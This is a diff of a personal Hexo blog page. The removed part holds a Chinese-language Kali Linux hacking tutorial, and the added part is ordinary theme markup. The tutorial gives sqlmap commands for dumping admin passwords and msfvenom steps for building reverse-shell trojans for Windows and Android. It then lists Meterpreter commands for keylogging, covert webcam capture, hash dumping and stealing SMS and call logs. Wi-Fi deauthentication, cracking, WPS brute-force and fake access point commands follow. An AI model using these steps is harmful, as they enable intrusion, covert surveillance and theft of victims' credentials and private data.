-<li>得到目标网站后台管理员的登录密码<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u 目标网站 --dump -C &quot;username,password&quot; -T &quot;user&quot;</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>–dump：下载数据<br>-C “username,password” 列名</p>
-<h3 id="7-3-PHP渗透"><a href="#7-3-PHP渗透" class="headerlink" title="7.3 PHP渗透"></a>7.3 PHP渗透</h3><p>待更新</p>
-<h3 id="7-4-Cookie渗透"><a href="#7-4-Cookie渗透" class="headerlink" title="7.4 Cookie渗透"></a>7.4 Cookie渗透</h3><p>待更新</p>
-<h2 id="八、Metasplooit"><a href="#八、Metasplooit" class="headerlink" title="八、Metasplooit"></a>八、Metasplooit</h2><h3 id="8-1-基本操作"><a href="#8-1-基本操作" class="headerlink" title="8.1 基本操作"></a>8.1 基本操作</h3><ul>
-<li>启动：msfconsole</li>
-<li>漏洞利用工具：exploit</li>
-<li>漏洞执行后的demo：payloads</li>
-</ul>
-<h3 id="8-2-远程控制软件"><a href="#8-2-远程控制软件" class="headerlink" title="8.2 远程控制软件"></a>8.2 远程控制软件</h3><h4 id="8-2-1-实现过程"><a href="#8-2-1-实现过程" class="headerlink" title="8.2.1 实现过程"></a>8.2.1 实现过程</h4><ul>
-<li><p>根据自己的ip设定一个木马（旧版使用msfpayload 不是 msfvenom -p），本操作是在桌面路径下执行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=kali的ip LPORT=55555 -f exe &gt; test.exe</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>之后会生成一个test.exe木马程序，将文件拖至windows平台上</p>
-</li>
-<li><p>使用handler模块，本操作以及之后的操作是在msfconsole下执行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>用shellcode程序</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>查看</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>设置参数，比如设置ip和端口</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set LHOST 自己的ip</span><br><span class="line">set LPORT 端口（55555）</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>执行并等待目标上钩</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<h4 id="8-2-2-木马基本功能"><a href="#8-2-2-木马基本功能" class="headerlink" title="8.2.2 木马基本功能"></a>8.2.2 木马基本功能</h4><p>当用户点击您的鱼饵之后，您就拥有了对方的所有权限，一下是一些基本的操作：</p>
-<ul>
-<li>sysinfo：获取到对方设备的系统信息</li>
-<li>shell获取受害者的终端权限，通过这个终端您就可以完全控制对方的设备</li>
-<li>background：将该权限放到后台，通过session -l（小写字母I） 1来重新获取会话</li>
-<li>run vnc：开启远程桌面，执行之后就可以看到对方完整的桌面了。</li>
-<li>注入进程</li>
-</ul>
-<ol>
-<li>得到要注入的pid进程：ls</li>
-<li>migrate XXX（pid）注入</li>
-</ol>
-<h3 id="8-2-3-文件管理功能"><a href="#8-2-3-文件管理功能" class="headerlink" title="8.2.3 文件管理功能"></a>8.2.3 文件管理功能</h3><ul>
-<li>download      下载文件</li>
-<li>edit      编辑文件</li>
-<li>cat       查看文件</li>
-<li>mkdir     创建文件夹</li>
-<li>mv        移动文件</li>
-<li>rm        删除文件</li>
-<li>upload        上传文件</li>
-<li>rmdir     删除文件夹</li>
-</ul>
-<h3 id="8-2-4-网络及系统操作"><a href="#8-2-4-网络及系统操作" class="headerlink" title="8.2.4 网络及系统操作"></a>8.2.4 网络及系统操作</h3><p>网络操作：</p>
-<ul>
-<li>arp       看arp缓冲表</li>
-<li>ifconfig      ip地址网卡</li>
-<li>getproxy      获取代理</li>
-<li>netstat       查看端口链接</li>
-</ul>
-<p>系统操作：</p>
-<ul>
-<li>kill      杀进程</li>
-<li>ps        查看进程表</li>
-<li>reboot    重启电脑</li>
-<li>reg       修改注册表</li>
-<li>shell     获取终端</li>
-<li>shutdown  关闭电脑</li>
-<li>sysinfo   获取系统信息</li>
-</ul>
-<h3 id="8-2-5-用户操作和其他功能"><a href="#8-2-5-用户操作和其他功能" class="headerlink" title="8.2.5 用户操作和其他功能"></a>8.2.5 用户操作和其他功能</h3><ul>
-<li>enumdesktops      窗体</li>
-<li>keyscan_dump      键盘记录–下载</li>
-<li>keyscan_start     键盘记录–开始</li>
-<li>keyscan_stop      键盘记录–停止</li>
-<li>uictl             获取键盘鼠标控制权</li>
-<li>record_mic        声音和音频录制</li>
-<li>webscan_chat      查看摄像头接口</li>
-<li>webscan_list      查看摄像头列表</li>
-<li>webscan_stream          查看摄像头获取（偷窥）</li>
-<li>getsystem     获取管理员权限</li>
-<li>hashdump      下载hash</li>
-<li></li>
-</ul>
-<h2 id="九、安卓渗透"><a href="#九、安卓渗透" class="headerlink" title="九、安卓渗透"></a>九、安卓渗透</h2><h3 id="9-1-实现过程"><a href="#9-1-实现过程" class="headerlink" title="9.1 实现过程"></a>9.1 实现过程</h3><ul>
-<li>9.1 在终端根据自己的ip生成安卓木马<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=kali的ip LPORT=55555 -f apk &gt; test.APK</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>生成木马之后，我们将木马程序装在手机上即可。在这里呢，也就是我们平时比较常见的未知链接、不明邮件之类的鬼东西。</p>
-<ul>
-<li><p>9.2 启动Metasplooit</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>9.3 使用handler</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>9.4 设置安卓木马</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set PAYLOAD android/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>9.5 查看参数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>9.6 设置参数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set LHOST 192.168.31.147</span><br><span class="line">set HPORT 55555</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>9.7 启动监听</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<h3 id="9-2-常见操作"><a href="#9-2-常见操作" class="headerlink" title="9.2 常见操作"></a>9.2 常见操作</h3><ul>
-<li>search        搜索文件（.jpg、.png、.bmp之类的文件），这个操作就有点邪恶了，大家一定要注意哦！！！</li>
-<li>download      下载（.jpg、.png、.bmp之类的文件，还有你的所有短信、所有电话联系人…………………）</li>
-<li>webcam_stream        开启手机摄像头</li>
-<li>webcam_snap       启动摄像头进行自动拍照（小心，这里拍照的过程中是不会有任何响应的，也就是说在这个过程中手机主人是不可能有任何察觉的）</li>
-<li>check_root    检查ROOT</li>
-<li>dump_calllog  下载电话记录</li>
-<li>dump_contracts    下载短信记录</li>
-<li>geolocat  gps定位</li>
-</ul>
-<h2 id="十、Fluxion"><a href="#十、Fluxion" class="headerlink" title="十、Fluxion"></a>十、Fluxion</h2><h3 id="10-1-Fluxion下载"><a href="#10-1-Fluxion下载" class="headerlink" title="10.1 Fluxion下载"></a>10.1 Fluxion下载</h3><p>下载fluxion源码并进入fluxion且运行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/FluxionNetwork/fluxion.git  </span><br><span class="line">cd fluxion</span><br><span class="line">./fluxion.sh</span><br><span class="line">若提示没下载fluxion.sh，则按照要求下载就行</span><br></pre></td></tr></table></figure></p>
-<h2 id="十一、密码破解"><a href="#十一、密码破解" class="headerlink" title="十一、密码破解"></a>十一、密码破解</h2><ul>
-<li><p>查看kali本机的密码字典</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">locate wordlist</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>查看某个密码文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/shadow</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>拷贝/etc/shadow密码文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /etc/shadow/ /root/Desktop/hash.list</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>more /etc/login.defs</p>
-</li>
-</ul>
-<h2 id="十二、Hydra"><a href="#十二、Hydra" class="headerlink" title="十二、Hydra"></a>十二、Hydra</h2><p>1</p>
-<h2 id="十三、无线破解"><a href="#十三、无线破解" class="headerlink" title="十三、无线破解"></a>十三、无线破解</h2><p>首先做的三步：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service network-manager stop</span><br><span class="line">airmon-ng check kill</span><br><span class="line">aiarmon-ng start wlan0</span><br></pre></td></tr></table></figure></p>
-<p>开启监听：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng statr wlan0</span><br></pre></td></tr></table></figure></p>
-<p>监听所有：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan0mon</span><br></pre></td></tr></table></figure></p>
-<p>监听指定bssid：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan0mon --bssid XXXX -c 频道 -w wpa(保存名)</span><br></pre></td></tr></table></figure></p>
-<p>将连接打掉：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -0 2 -a [mac地址] -c [客户端mac地址] wlan0mon</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifconfig wlan0mon down</span><br><span class="line">ifconfig wlan0mon up</span><br></pre></td></tr></table></figure>
-<p>破解：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -w [字典] /root/XXX.cap</span><br></pre></td></tr></table></figure></p>
-<p>kali自带常用字典目录：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/john/password.lst</span><br><span class="line">/usr/share/wfuzz/wordlist/</span><br></pre></td></tr></table></figure></p>
-<p>查看字典文件是否含有该密码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep Password password.lst</span><br></pre></td></tr></table></figure></p>
-<p>查看字典有多少行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat [字典] | wc -l</span><br></pre></td></tr></table></figure></p>
-<p>解压文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gunzip rockyou.txt.gz</span><br></pre></td></tr></table></figure></p>
-<hr>
-<p>发现支持wps的AP<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wash -i wlan0mon</span><br><span class="line">或者是</span><br><span class="line">airodump-ng wlan0mon --wps</span><br></pre></td></tr></table></figure></p>
-<p>爆破pin码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reaver -i wlan0mon -b [ap mac] -vv -c [信道]</span><br></pre></td></tr></table></figure></p>
-<hr>
-<p>wifite</p>
-<hr>
-<p>伪造wifi：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airbase-ng -a [ap_mac] -c [信道] --essid [wifi名字] wlan0mon</span><br></pre></td></tr></table></figure></p>
-<p><code>`</code><br>echo [ap(wifi名)] &gt;essid.txt<br>airolib-ng essid_db –import essid essid.txt<br>airolib-ng essid_db –stats<br>airolib-ng essid_db –import password ./names.txt<br>airolib-ng essid_db –batch<br>aircrack-ng -r essid_fb /root/wpa-01.cap</p>
+      
 
-        
-    </article>
-    <footer class="cube-excerpt-footer">
-        <a class="cube-excerpt-more" href="/2018/11/23/Kali/">Read More</a>
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
     </footer>
-</div>
+  </div>
+  
+  
+  
+  </article>
 
-<div class="cube-excerpt" id="cube-excerpt-Hello World">
-    <header class="cube-excerpt-header">
-        <h1><a href="/2018/11/22/hello-world/">Hello World</a></h1>
-        <div class="cube-excerpt-header-msg">
-            <div class="cube-excerpt-date">
-                <i class="cube-icon cube-icon-date" aria-hidden="true"></i>
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/22/hello-world/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="txj">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/22/hello-world/" itemprop="url">Hello World</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-22T22:56:58+08:00">
                 2018-11-22
-            </div>
-            <div class="cube-excerpt-tags">
-                <i class="cube-icon cube-icon-tag" aria-hidden="true"></i>
-                
-            </div>
-        </div>
-    </header>
-    <article class="cube-excerpt-entry cube-markdown">
-        
-        
-           <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+              </time>
+            
 
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
         
-    </article>
-    <footer class="cube-excerpt-footer">
-        <a class="cube-excerpt-more" href="/2018/11/22/hello-world/">Read More</a>
+          
+          Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
+Quick StartCreate a new post1$ hexo new "My New Post"
+More info: Writing
+Run server1$ hexo server
+More in
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/11/22/hello-world/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
     </footer>
-</div>
+  </div>
+  
+  
+  
+  </article>
 
-
-
-<ul class="cube-pagination cube-pagination-6">
-    
-    <li class="cube-pagination-prev disabled">
-        <span>« Prev</span>
-    </li>
-    
-    
-        
-            
-            <li class="cube-pagination-index disabled">
-                <span>1</span>
-            </li>
-            
-        
-    
 
     
-    <li class="cube-pagination-next disabled">
-        <span>Next »</span>
-    </li>
-    
-</ul>
+  </section>
 
-<!--其他组件后续添加-->
-        </div>
-        <div class="cube-right">
-            
-
-<div class="cube-search cube-sidebar" id="cube-search">
-    <div class="search-container">
-        <input type="text" placeholder="Search" class="cube-search-input" id="cube-search-input">
-        <i class="cube-icon cube-icon-search cube-search-submit" aria-hidden="true"></i>
-    </div>
-    <!-- TODO 通过给window赋一个全局变量，通过脚本赋值 -->
-</div>
-<script>
-    (function (window) {
-        'use strict';
-        window.searchModule = {}
-        window.searchModule.JSONUrl = '/content.json'
-        window.searchModule.rootUrl = '/'
-    })(window)
-</script>
-<div class="cube-search-form">
-    <div class="cube-search-control">
-        <input type="text" placeholder="Search" class="search-input">
-        <a class="close-button">
-            <i class="cube-icon cube-close" aria-hidden="true"></i>
-        </a>
-    </div>
-    <div class="cube-search-result"></div>
-</div>
+  
 
 
-<div class="cube-author cube-sidebar" id="cube-author">
-    
-    
-    <span>John Doe</span>
-    
-    
-    <div class="count">
-        <a class="count articles"><span>2</span>Article</a>
-        <a class="count tags"><span>0</span>Tags</a>
-        <a class="count categories"><span>0</span>Categories</a>
-    </div>
-</div>
+          </div>
+          
 
 
-
-<div class="cube-music cube-sidebar" id="cube-music">
-    <div class="cube-player aplayer" id="cube-player"></div>
-</div>
-<script>
-    (function (window) {
-        window.musicModule = {}
-        window.musicModule.musicConfig = '{"narrow":false,"autoplay":false,"showlrc":3,"theme":"#b7daff","mutex":true,"mode":"circulation","preload":"auto","listmaxheight":"513px","music":[{"title":"Dear friends","author":"TRIPLANE","url":"http://cube-1252774894.cosgz.myqcloud.com/music/source/TRIPLANE - Dear friends.mp3","lrc":"http://cube-1252774894.cosgz.myqcloud.com/music/lrc/Dear friends - TRIPLANE.lrc","pic":"http://cube-1252774894.cosgz.myqcloud.com/music/image/TRIPLANE - Dear friends.jpg"},{"title":"Butter-Fly","author":"和田光司","url":"http://cube-1252774894.cosgz.myqcloud.com/music/source/和田光司 - Butter-Fly (ピアノヴァージョン).mp3","lrc":"http://cube-1252774894.cosgz.myqcloud.com/music/lrc/Butter-Fly (ピアノヴァージョン) - 和田光司.lrc","pic":"http://cube-1252774894.cosgz.myqcloud.com/music/image/和田光司 - Butter-Fly (ピアノヴァージョン).jpg"},{"title":"宵闇花火","author":"葉月ゆら","url":"http://cube-1252774894.cosgz.myqcloud.com/music/source/葉月ゆら - 宵闇花火.mp3","lrc":"http://cube-1252774894.cosgz.myqcloud.com/music/lrc/宵闇花火 - 葉月ゆら.lrc","pic":"http://cube-1252774894.cosgz.myqcloud.com/music/image/葉月ゆら - 宵闇花火.jpg"},{"title":"我的心太乱","author":"周传雄","url":"http://www.ytmp3.cn/down/48418.mp3","lrc":"http://www.ytmp3.cn/down/48418.mp3# before using the comment","pic":"http://yoursite.com/images/music/undefined"}]}'
-        window.musicModule.lrcConfig = {
-            open: 'Open Lyrics',
-            close: 'Close Lyrics'
-        }
-    })(window)
-</script>
-
-
-
-<div class="cube-recent-posts cube-sidebar" id="cube-recent-posts">
-    <div class="title">
-        <a>Recent Posts</a>
-    </div>
-    <ul class="list">
-        
-        
-        <li>
-            <!-- TODO 如果文章要显示图片，那么在front-matter上添加preview属性(url or path) -->
-            
-            <div class="normal">
-                <p class="index first">
-                    <span>1</span>
-                </p>
-                <p class="title">
-                    <a href="/2018/11/23/Kali/" title="Kali">Kali</a>
-                </p>
-            </div>
-            
-        </li>
-        
-        
-        
-        <li>
-            <div class="normal">
-                <p class="index">
-                    <span>2</span>
-                </p>
-                <p class="title">
-                    <a href="/2018/11/22/hello-world/" title="Hello World">Hello World</a>
-                </p>
-            </div>
-        </li>
-        
-        
-    </ul>
-</div>
-
-
-
-
-
-
-
-<div class="cube-links cube-sidebar" id="cube-links">
-    <div class="title">
-        <a>Links</a>
-    </div>
-    <ul class="list">
-        
-        <li>
-            
-            
-            <img src="http://cube-1252774894.cosgz.myqcloud.com/links/GitHub.png">
-            
-            <a href="https://github.com/ZEROKISEKI" target="_blank">GitHub</a>
-        </li>
-        
-        <li>
-            
-            
-            <img src="http://cube-1252774894.cosgz.myqcloud.com/links/Coding.png">
-            
-            <a href="https://coding.net/u/SORA1" target="_blank">Coding</a>
-        </li>
-        
-        <li>
-            
-            
-            <img src="http://cube-1252774894.cosgz.myqcloud.com/links/SF.png">
-            
-            <a href="https://segmentfault.com/u/aonosora" target="_blank">SF社区</a>
-        </li>
-        
-        <li>
-            
-            
-            <img src="http://cube-1252774894.cosgz.myqcloud.com/links/开发者头条.png">
-            
-            <a href="https://toutiao.io/u/148070" target="_blank">开发者头条</a>
-        </li>
-        
-    </ul>
-</div>
-
-
-
-<div class="cube-friend-links cube-sidebar" id="cube-friend-links">
-    <div class="title">
-        <a>Friend Links</a>
-    </div>
-    <ul class="list">
-        
-        <li>
-            <!-- TODO change avatar.png to friend.png-->
-            <img src="http://cube-1252774894.cosgz.myqcloud.com/friend_links/micblo.png">
-            <a href="https://blog.micblo.com/" target="_blank">罗大佬</a>
-        </li>
-        
-        <li>
-            <!-- TODO change avatar.png to friend.png-->
-            <img src="http://cube-1252774894.cosgz.myqcloud.com/friend_links/DIYgod.jpg">
-            <a href="https://www.anotherhome.net/" target="_blank">DIYgod</a>
-        </li>
-        
-        <li>
-            <!-- TODO change avatar.png to friend.png-->
-            <img src="/images/friend_links.jpg ">
-            <a href="https://aonosora.com/" target="_blank">咪西西の部落格</a>
-        </li>
-        
-    </ul>
-</div>
-
+          
 
         </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
     </div>
-</div>
-<footer class="cube-footer">
-    
-© 2017 John Doe
+  </div>
 
-<br>
-Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>.&nbsp;Theme by <a href="https://github.com/ZEROKISEKI" target="_blank">AONOSORA</a>
-</footer>
-<!-- inject:script -->
-<script src="/js/script.js"></script>
-<!-- endinject -->
-<div class="cube-loading out"></div>
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">txj</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 - 2018 &mdash; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">txj</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
 </body>
 </html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/clicklove.js"></script>
+
+<!--崩溃欺骗-->
+<script type="text/javascript" src="/js/src/crash_cheat.js"></script>
